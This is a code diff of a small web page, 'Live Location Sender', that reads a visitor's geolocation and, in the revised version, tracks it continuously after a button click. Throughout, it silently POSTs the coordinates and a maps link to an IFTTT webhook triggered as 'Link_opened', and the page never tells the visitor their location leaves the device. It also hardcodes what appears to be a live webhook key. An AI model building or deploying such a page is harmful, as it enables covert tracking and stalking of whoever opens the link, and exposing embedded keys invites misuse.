@@ -2,42 +2,59 @@
 <html>
 <head>
   <title>Live Location Sender</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    #coords { margin-top: 20px; }
+    #startButton { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h2>Fetching your location...</h2>
+  <p id="coords">Please allow location access.</p>
+  <button id="startButton">Start Location Tracking</button>
+
   <script>
-    function sendLocation() {
+    const startButton = document.getElementById('startButton');
+    const coordsEl = document.getElementById('coords');
+
+    function sendLocation(latitude, longitude) {
+      const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+      coordsEl.innerHTML = `Latitude: ${latitude} <br> Longitude: ${longitude} <br> <a href="${mapsLink}" target="_blank">Open in Maps</a>`;
+
+      // IFTTT webhook
+      const url = "https://maker.ifttt.com/trigger/Link_opened/with/key/iuwEGmz1sskpO7aR6oVBFCBIgrkCLRibC_3FrQcbJGm";
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ value1: latitude, value2: longitude, value3: mapsLink })
+      })
+      .then(() => console.log("Location sent!"))
+      .catch(error => console.error("Error sending location:", error));
+    }
+
+    function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          var latitude = position.coords.latitude.toString();
-          var longitude = position.coords.longitude.toString();
-          var mapsLink = "https://maps.google.com/?q=" + latitude + "," + longitude;
-
-          // IFTTT Webhook URL
-          var url = "https://maker.ifttt.com/trigger/Link_opened/with/key/iuwEGmz1sskpO7aR6oVBFCBIgrkCLRibC_3FrQcbJGm";
-
-          // Send location to IFTTT
-          fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              value1: latitude,
-              value2: longitude,
-              value3: mapsLink
-            })
-          })
-          .then(() => console.log("Location sent!"))
-          .catch(error => console.error("Error sending location:", error));
-        }, function(error) {
-          console.error("Error getting location:", error);
-        }, { enableHighAccuracy: true });
+        navigator.geolocation.watchPosition(
+          function(position) {
+            const lat = position.coords.latitude.toString();
+            const lon = position.coords.longitude.toString();
+            sendLocation(lat, lon);
+          },
+          function(error) {
+            coordsEl.innerText = "Error getting location: " + error.message;
+          },
+          { enableHighAccuracy: true }
+        );
       } else {
-        alert("Geolocation not supported on this device.");
+        coordsEl.innerText = "Geolocation not supported on this device.";
       }
     }
 
-    window.onload = sendLocation;
+    // Mobile browsers require a user gesture, so hide the button after first click
+    startButton.addEventListener('click', () => {
+      startButton.style.display = 'none';
+      getLocation();
+    });
   </script>
-</head>
-<body>
-  <h2>Sharing your location automatically...</h2>
-  <p>Please allow location access when prompted.</p>
 </body>
 </html>
